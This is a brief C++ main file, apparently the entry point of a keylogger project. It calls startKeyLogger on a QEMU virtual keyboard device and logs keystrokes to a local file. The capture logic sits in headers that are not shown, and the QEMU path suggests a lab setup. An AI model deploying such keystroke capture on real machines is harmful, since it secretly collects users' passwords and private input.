#include "keylogger.hpp"
#include "keyboard_layout.hpp"
#include <iostream>
#include <string>

int main() {
    const char* device = "/dev/input/by-id/usb-QEMU_QEMU_USB_Keyboard_68284-0000:00:04.0-3-event-kbd";
    if (!startKeyLogger(device, "logs/keylog.txt")) {
        return 1;
    }

    return 0;
}
